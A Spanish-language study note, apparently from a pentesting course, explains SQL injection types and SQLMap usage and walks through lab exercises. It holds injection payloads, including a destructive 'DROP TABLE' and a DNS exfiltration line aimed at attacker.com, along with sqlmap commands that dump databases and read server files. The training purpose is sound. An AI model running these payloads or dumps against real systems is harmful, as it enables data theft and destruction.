 07-08-2024 20:22
Status: #idea
Tags: [[Exploiting]], [[SQL Injections]]

# SQLMap

- [[#Instalación de SQLMap|Instalación de SQLMap]]
- [[#Tipos de SQLi:|Tipos de SQLi:]]
	- [[#Tipos de SQLi:#Boolean Based Bling SQL Injection|Boolean Based Bling SQL Injection]]
	- [[#Tipos de SQLi:#Error-based SQL Injection|Error-based SQL Injection]]
	- [[#Tipos de SQLi:#UNION query-based|UNION query-based]]
	- [[#Tipos de SQLi:#Stacked queries|Stacked queries]]
	- [[#Tipos de SQLi:#Time-based blind SQL Injection|Time-based blind SQL Injection]]
	- [[#Tipos de SQLi:#Inline queries|Inline queries]]
	- [[#Tipos de SQLi:#Out-of-band SQL Injection|Out-of-band SQL Injection]]
- [[#Empezando a usar SQLMap|Empezando a usar SQLMap]]
	- [[#Empezando a usar SQLMap#Ayuda estándar:|Ayuda estándar:]]
	- [[#Empezando a usar SQLMap#Ayuda avanzada:|Ayuda avanzada:]]
	- [[#Empezando a usar SQLMap#Ejemplo práctico sencillo:|Ejemplo práctico sencillo:]]
- [[#Ejecutar SQLMap en una petición HTTP|Ejecutar SQLMap en una petición HTTP]]
	- [[#Ejecutar SQLMap en una petición HTTP#Comandos CURL|Comandos CURL]]
	- [[#Ejecutar SQLMap en una petición HTTP#GET/POST Requests|GET/POST Requests]]
	- [[#Ejecutar SQLMap en una petición HTTP#Peticiones HTTP completas|Peticiones HTTP completas]]
	- [[#Ejecutar SQLMap en una petición HTTP#Custom SQLMap Requests|Custom SQLMap Requests]]
	- [[#Ejecutar SQLMap en una petición HTTP#Peticiones HTTP personalizadas|Peticiones HTTP personalizadas]]
	- [[#Ejecutar SQLMap en una petición HTTP#Ejercicio Práctico|Ejercicio Práctico]]
		- [[#Ejercicio Práctico#Case 2: POST Parameter|Case 2: POST Parameter]]
		- [[#Ejercicio Práctico#Case 3: Cookie parameter|Case 3: Cookie parameter]]
		- [[#Ejercicio Práctico#Case 4: JSON value|Case 4: JSON value]]


## Instalación de SQLMap

Para instalar sqlmap (ya viene instalado en kali y pwnbox):

```shell
sudo apt install sqlmap
```

SQLMap da soporte a estas bases de datos:

![[Captura de pantalla 2024-11-29 a las 18.19.59.png]]

SQLMap detectará por nosotros y nos ayudará a hacer payloads que se ajusten a nuestro objetivo.

## Tipos de SQLi:
### Boolean Based Bling SQL Injection

```sql
AND 1=1
```

SQLMap exploitea este tipo de inyección SQL a través de la diferenciación de TRUE a FALSE en las queries. Compara de todo, ya sea contenido de respuestas, códigos HTTP, títulos de páginas, texto filtrado y otros factores.

Este tipo de inyección es la más común en páginas web.

### Error-based SQL Injection

```sql
AND GTID_SUBSET(@@version,0)
```

Si los errores del sistema de gestión de bases de datos (SGBD) se devuelven como parte de la respuesta del servidor para cualquier problema relacionado con la base de datos, existe la probabilidad de que puedan utilizarse para transportar los resultados de las consultas solicitadas. En tales casos, se utilizan cargas útiles especializadas para el DBMS actual, dirigidas a las funciones que causan comportamientos erróneos conocidos. SQLMap tiene la lista más completa de cargas útiles relacionadas y cubre la Inyección SQL basada en errores para los siguientes SGBD:

![[Captura de pantalla 2024-11-29 a las 18.53.14.png]]

Este tipo de inyección se considera tan rápida como el resto, menos la UNION-based, porque solo devuelve una cantidad limitada de datos (200 bytes) llamados "chunks" en cada request.

### UNION query-based

```sql
UNION ALL SELECT 1,@@version,3
```

Con el uso de UNION, generalmente es posible extender la consulta original (vulnerable) con los resultados de las sentencias inyectadas. De esta forma, si los resultados de la consulta original se muestran como parte de la respuesta, el atacante puede obtener resultados adicionales de las sentencias inyectadas dentro de la propia respuesta de la página. Este tipo de inyección SQL se considera el más rápido, ya que, en el escenario ideal, el atacante podría extraer el contenido de toda la tabla de la base de datos de interés con una sola petición.

### Stacked queries

```sql
; DROP TABLE users
```

El apilamiento de consultas SQL, también conocido como «piggy-backing», es la forma de inyectar sentencias SQL adicionales después de la vulnerable. En caso de que sea necesario ejecutar sentencias que no sean consultas (por ejemplo, INSERT, UPDATE o DELETE), el apilamiento debe estar soportado por la plataforma vulnerable (por ejemplo, Microsoft SQL Server y PostgreSQL lo soportan por defecto). SQLMap puede utilizar dichas vulnerabilidades para ejecutar sentencias no basadas en consultas ejecutadas en funciones avanzadas (por ejemplo, ejecución de comandos del sistema operativo) y recuperación de datos de forma similar a los tipos SQLi ciegos basados en tiempo.

### Time-based blind SQL Injection

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

Son iguales a las boolean based, solo que sabremos si están funcionando o no dependiendo del tiempo en el que tarde en respondernos el servidor.

Por esto mismo, son uno de los tipos de SQLi más lentos, ya que hay una delay hasta que responde el servidor.

### Inline queries

```sql
SELECT (SELECT @@version) from
```

Esto nos permitiría ejecutar una query a partir de la query original, y es un tipo poco común, ya que esto puede pasar si se escribe mal código en la aplicación, y ya depende de que se escriba de una manera concreta.

### Out-of-band SQL Injection

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

Se considera uno de los tipos más avanzados de SQLi, utilizado en los casos en que todos los demás tipos no son compatibles con la aplicación web vulnerable o son demasiado lentos (por ejemplo, SQLi ciego basado en el tiempo). SQLMap soporta SQLi fuera de banda a través de la «exfiltración DNS», donde las consultas solicitadas se recuperan a través del tráfico DNS.

Al ejecutar SQLMap en el servidor DNS para el dominio bajo control (por ejemplo, .atacante.com), SQLMap puede realizar el ataque forzando al servidor a solicitar subdominios inexistentes (por ejemplo, foo.atacante.com), donde foo sería la respuesta SQL que queremos recibir. SQLMap puede entonces recoger estas peticiones DNS erróneas y recoger la parte foo, para formar la respuesta SQL completa.

## Empezando a usar SQLMap

### Ayuda estándar:

```shell
sqlmap -h
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs
```

### Ayuda avanzada:

```shell
s1lentz@htb[/htb]$ sqlmap -hh
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.9#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -d DIRECT           Connection string for direct database connection
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
    -m BULKFILE         Scan multiple targets given in a textual file
    -r REQUESTFILE      Load HTTP request from a file
    -g GOOGLEDORK       Process Google dork results as target URLs
    -c CONFIGFILE       Load options from a configuration INI file

  Request:
    These options can be used to specify how to connect to the target URL

    -A AGENT, --user..  HTTP User-Agent header value
    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --param-del=PARA..  Character used for splitting parameter values (e.g. &)
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
...SNIP...
```

### Ejemplo práctico sencillo:

Se nos presenta esta página:

![[Pasted image 20241129190322.png]]

Vemos que hay un error sintáctico de SQL, y vemos que en nuestra página hay un parámetro get llamado id, dejando la url así: http://www.example.com/vuln.php?id=1

Usando SQLMap de la siguiente manera, obtendremos resultados:

```shell
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 22:26:45 /2020-09-09/

[22:26:45] [INFO] testing connection to the target URL
[22:26:45] [INFO] testing if the target URL content is stable
[22:26:46] [INFO] target URL content is stable
[22:26:46] [INFO] testing if GET parameter 'id' is dynamic
[22:26:46] [INFO] GET parameter 'id' appears to be dynamic
[22:26:46] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[22:26:46] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[22:26:46] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[22:26:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:26:46] [WARNING] reflective value(s) found and filtering out
[22:26:46] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")
[22:26:46] [INFO] testing 'Generic inline queries'
[22:26:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[22:26:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
...SNIP...
[22:26:46] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[22:26:46] [INFO] testing 'MySQL inline queries'
[22:26:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[22:26:46] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                                                                                       
...SNIP...
[22:26:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:26:56] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[22:26:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:26:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:26:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:26:56] [INFO] target URL appears to have 3 columns in query
[22:26:56] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8814=8814

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -
---
[22:26:56] [INFO] the back-end DBMS is MySQL
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL >= 5.0
[22:26:57] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'

[*] ending @ 22:26:57 /2020-09-09/
```

> [!TIP]
> En este caso proporcionamos la url del target con la opción -u, y usamos la opción --batch para saltarnos cualquier tipo de input que necesito que introduzcamos datos, escogiendo así la opción por defecto.

## Ejecutar SQLMap en una petición HTTP

Muchas veces obtendremos falsos positivos, o dejaremos de obtener positivos reales por poner valores malos a las cookies, complicar de más la ejecución de sqlmap, una declaración errónea de valores POST, etc.

### Comandos CURL

Una de las maneras más sencillas para poner una request contra un objetivo es utilizando la feature Copy as cURL en el menú de Network de nuestro navegador.

![[Pasted image 20241129191325.png]]

Simplemente con copiar esto, pegarlo en nuestra terminal, y cambiar curl por sqlmap, seremos capaces de correr sqlmap en esta petición específica:

```shell
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

Cuando le damos datos a SQLMap, siempre tiene que haber un parámetro que pueda ser vulnerable, o algún tipo de opciones/switches para que SQLMap encuentre los parámetros de manera automática, como por ejemplo, --crawl, --forms o -g.

### GET/POST Requests

En los escenarios más comunes, los parámetros GET se van a enviar en la opción de la url (-u o --url).

Mientras que para peticiones POST, podemos usar la flag --data de la siguiente manera:

```shell
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

En este caso, los parámetros uid y name son los que se van a intentar vulnerar, si tenemos una indicación clara de que un parámetro es vulnerable a SQLi, podremos poner ese único parámetro con la flag -p uid, o marcarlo con un caracter especial (``*``), dentro de la flag --data:

```shell
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

### Peticiones HTTP completas

Si necesitamos especificar una petición HTTP completa con muchas headers, o un body POST grande, podremos usar la flag -r.

![[Pasted image 20241129192032.png]]

Esto lo haremos capturando la request en Burp o ZAP, guardando esta request en un fichero .txt o el formato que queramos.

```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

Esto lo podremos hacer dando click derecho y seleccionando Copy to file, o copiando manualmente y pegando en un fichero nuevo.

Posteriormente, en SQLMap podremos hacer lo siguiente:

```shell
sqlmap -r req.txt
```

Y comenzará a funcionar con nuestra nueva request.

> [!TIP]
> De manera similar a la opción '--data', dentro de nuestro fichero de request podremos marcar el parámetro que queremos vulnerar con un asterisco (`*`), como por ejemplo, '/?id=1*'.

### Custom SQLMap Requests

Si queremos hacer peticiones complicadas a mano, podríamos hacerlas dependiendo de los requerimientos que busquemos, por ejemplo:

Si queremos especificar una cookie, lo haremos con la opción --cookie:

```shell
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

Esto se podría hacer igualmente con la opción -H/--header:

```shell
sqlmap ... --H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

Podremos hacer lo mismo con otras opciones tales como --host, --referer, y -A/--user-agent.

También hay otros switches como --random-agent que nos asignarán un User-agent completamente aleatorio. Podremos hacer lo mismo con el switch --mobile, para tener un User-Agent de teléfono.

Esto es muy importante, ya que normalmente, si mantenemos el User-Agent de serie, nos van a bloquear las requests siempre, ya que sería ``sqlmap/1.4.9.12#dev (http://sqlmap.org)``. 

Por defecto, SQLMap se centra en parámetros HTTP, pero si ponemos el asterisco (``*``) en cualquier parte que pensemos que puede ser vulnerable, como por ejemplo, una cookie, podríamos hacerlo con su correspondiente switch:

```shell
sqlmap ... --cookie='id=1*'
```

También podremos especificar un método alternativo a GET o POST con la flag --method, por ejemplo:

```shell
sqlmap ... --cookie='id=1*' --method PUT
```

### Peticiones HTTP personalizadas

A parte del típico body de un POST que podremos usar con el switch --data, SQLMap también da soporte a body formateado en JSON ({"id": 1}), y a body formateado en XML ``<element><id>1</id></element>``.

En caso de que el body de un POST sea sencillo, con el switch --data será suficiente.

De todas maneras, si es más complejo, podremos usar el switch -r:

```shell
cat req.txt
HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z",
      "updated": "2020-05-22T14:56:28.000Z"
    },
    "relationships": {
      "author": {
        "data": {"id": "42", "type": "user"}
      }
    }
  }]
}


sqlmap -r req.txt
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.9}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 00:03:44 /2020-09-15/

[00:03:44] [INFO] parsing HTTP request from 'req.txt'
JSON data found in HTTP body. Do you want to process it? [Y/n/q] 
[00:03:45] [INFO] testing connection to the target URL
[00:03:45] [INFO] testing if the target URL content is stable
[00:03:46] [INFO] testing if HTTP parameter 'JSON type' is dynamic
[00:03:46] [WARNING] HTTP parameter 'JSON type' does not appear to be dynamic
[00:03:46] [WARNING] heuristic (basic) test shows that HTTP parameter 'JSON type' might not be injectable
```

### Ejercicio Práctico

Se nos presenta esta práctica en la que cada caso nos va a dar una flag vulnerando parámetros de peticiones.

En este primer caso es un parámetro POST, el procedimiento es muy sencillo.

#### Case 2: POST Parameter

![[Captura de pantalla 2024-11-29 a las 19.39.54.png]]

```shell
sqlmap -u http://94.237.62.166:55261/case2.php --data "id=1*" --batch --dump
```

Ejecutando este comando, estamos indicando el target, con --data estamos indicando el parámetro que queremos vulnerar y con el asterisco, y con las flags --batch --dump nos permite hacer un volcado de la base de datos, que es requerido para esta práctica.


#### Case 3: Cookie parameter

En este caso nos presenta una cookie, una casuística bastante sencilla también.

![[Captura de pantalla 2024-11-29 a las 19.43.50.png]]

Procedemos a capturar la request con Burp y pulsamos Copy to file para exportar la petición, recuerda añadir el asterisco directamente en burp, así no tienes que modificar el fichero posteriormente.

![[Captura de pantalla 2024-11-29 a las 19.41.28.png]]

![[Captura de pantalla 2024-11-29 a las 19.42.51 1.png]]

Ahora solo nos faltaría ejecutar el comando, y ya tendremos nuestra flag.

```shell
sqlmap -r case3 --dump --batch
```

![[Captura de pantalla 2024-11-29 a las 19.45.02.png]]

#### Case 4: JSON value

En este caso vamos a buscar la vulnerabilidad en parámetros del JSON que va en el body de nuestra petición POST.

![[Captura de pantalla 2024-11-29 a las 19.46.21.png]]

Como hicimos anteriormente, interceptamos la petición, modificamos el cuerpo para indicar el parámetro a vulnerar con el asterisco.

![[Captura de pantalla 2024-11-29 a las 19.49.16.png]]

Y posteriormente, arrancamos sqlmap con la flag -r en la que indicamos el fichero de nuestra request, seguido de las opciones --dump y --batch para obtener nuestras flags.

```shell
sqlmap -r case4.txt --dump --batch
```

![[Captura de pantalla 2024-11-29 a las 19.51.15.png]]


Comandos usados comúnmente en SQLMap:

- `sqlmap -u http://10.10.48.53:84/admin_edit.php?bookisbn=1 --dbs`: Obtemos as bases de datos
- `sqlmap -u http://10.10.48.53:84/admin_edit.php?bookisbn=1 -D www_project -T admin --columns`: Obtemos as columnas da tabla admin, na base de datos www_project.
- `sqlmap -u http://10.10.48.53:84/admin_edit.php?bookisbn=1 -D www_project --tables`: Danos as tablas da base de datos.
- sqlmap -u http://10.10.80.230:84/admin_edit.php?bookisbn=1 --\sql-query "select LOAD_FILE('/opt/flag.txt')": Leer archivos.




---
# {{References}}